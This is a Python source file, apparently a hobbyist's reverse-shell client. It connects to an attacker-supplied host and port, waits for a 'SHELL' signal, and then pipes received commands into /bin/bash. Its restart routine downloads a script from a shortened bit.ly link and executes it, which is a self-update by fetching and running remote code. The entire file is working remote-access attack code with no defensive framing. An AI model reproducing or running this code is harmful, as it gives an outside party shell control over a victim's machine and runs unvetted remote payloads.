"""
Async client for reverse shelling ୧༼ಠ益ಠ༽︻╦╤─

Expects server ip and port as command line arguments
Executes /bin/bash and uses Streamread/Streamwrite as its stdin/stdout
    Connection (TCP) is kept open until closed by server

Updates itself by executing the .py downloaded from RELEASE
"""

import urllib.request
import subprocess
import logging
import socket
import time
import sys
import os

HOST = sys.argv[1]
PORT = int(sys.argv[2])

RELEASE = "https://bit.ly/2Cp4hXU"


def restart(file_url=RELEASE, generation=0):
    script_name = "client{}.py".format(generation)
    urllib.request.urlretrieve(file_url, script_name)
    pythonpath = sys.executable
    os.execl(pythonpath, pythonpath, script_name, HOST, PORT)


logformat = logging.Formatter("%(asctime)s %(levelname)s:%(name)s: %(message)s")
logger = logging.getLogger("client")
logger.setLevel(logging.DEBUG)
fh = logging.FileHandler('client.log')
fh.setLevel(logging.DEBUG)
fh.setFormatter(logformat)
logger.addHandler(fh)

logger.info(sys.version_info)

print(sys.byteorder)


def subp_run(command):
    return subprocess.run(command, shell=True,
                          stdout=subprocess.PIPE,
                          stderr=subprocess.STDOUT,
                          stdin=subprocess.PIPE,
                          timeout=None)

def ping():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.connect((HOST, PORT))
            s.sendall(b'Marco')
            data = s.recv(4)
            print('Received', repr(data))

        except ConnectionRefusedError as err:
            logger.warning(err)
            restart()
            return err

        if data == b'Polo':
            data = s.recv(1024)  # TODO timeout before back to pinging
            if data == b'SHELL':
                print(data)
                loop_shell(s)
        else:
            time.sleep(5)
            ping()

def loop_shell(s: socket):

    proc = subprocess.Popen(['/bin/bash'],
                            shell=False,
                            stdin=subprocess.PIPE,
                            stdout=subprocess.PIPE,
                            stderr=subprocess.STDOUT,
                            bufsize=0)

    while True:
        data = s.recv(1024)
        print(data)
        assert data[-4:] == b' AYE'
        proc.stdin.write(data[:-4]+b'\n')
        time.sleep(1)
        print(proc.stdout.readline())

# loop_shell(1)
data = ping()




#if __name__ == "__main__":
#    import pathlib
#    import sys
#    assert sys.version_info >= (3, 7), "Pls"
#    here = pathlib.Path(__file__).parent
#    logpath = here.joinpath("client.log")


# socket family is AF_INET (ipv4)
# socket type is SOCK_STREAM (connection oriented TCP protocol)
